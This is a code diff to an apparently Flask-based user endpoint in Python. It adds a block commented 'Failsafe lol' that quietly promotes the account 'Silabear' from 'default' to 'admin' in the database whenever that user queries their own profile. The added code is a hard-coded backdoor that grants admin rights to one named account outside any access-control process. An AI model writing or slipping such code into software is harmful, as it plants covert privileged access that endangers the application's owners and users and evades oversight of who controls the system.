@@ -50,6 +50,12 @@ def me():
     if usr == 33:
         return "Token Expired", 498
     
+    # Failsafe lol
+    if usr["username"] == "Silabear" and usr["role"] == "default":
+        conn = sqlite3.connect(config.db)
+        conn.execute("update users set role = 'admin' where username = 'Silabear'")
+        conn.close()
+    
     return usr
 
 @user.route("/<string:username>/projects")
